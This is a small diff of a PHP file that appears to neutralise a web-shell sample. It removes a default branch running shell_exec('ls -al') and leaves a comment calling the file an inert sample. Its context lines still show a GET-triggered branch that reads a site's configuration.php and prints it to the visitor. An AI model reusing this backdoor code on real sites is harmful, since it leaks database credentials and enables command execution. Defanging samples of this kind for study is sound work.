@@ -61,5 +61,4 @@ elseif(isset($_GET['rf'])){
 $rf = file_get_contents("../../configuration.php");
 echo $rf;
 }
-else { echo "<pre><font size=3 color=#000000>".shell_exec('ls -al')."</font></pre>";
-}
+// no default action in inert sample
